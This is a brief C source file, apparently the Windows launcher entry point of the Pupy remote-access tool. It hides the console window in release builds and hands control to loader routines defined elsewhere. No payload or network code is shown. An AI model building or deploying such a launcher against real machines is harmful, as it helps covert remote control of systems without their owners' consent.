#include <windows.h>
#include <winbase.h>
#include <winuser.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <shellapi.h>
#include "pupy_load.h"
#include "debug.h"

#ifdef HAVE_WINDOW
int PASCAL WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpszCmdLine, int nCmdShow)
{
    DWORD dwExitCode;

#ifdef DEBUG
    AttachConsole(-1);
#else
    FreeConsole();
#endif
    dprint("Have window\n");
#else
int main()
{
    DWORD dwExitCode;
    dprint("No window\n");
#endif

    dprint("Initialization...\n");
    initialize(FALSE);
    dprint("Execution...\n");
    dwExitCode = execute(NULL);
    dprint("Deinitialization...\n");
    deinitialize();
    dprint("Exit\n");

    return dwExitCode;
}

void setup_jvm_class(void) {}
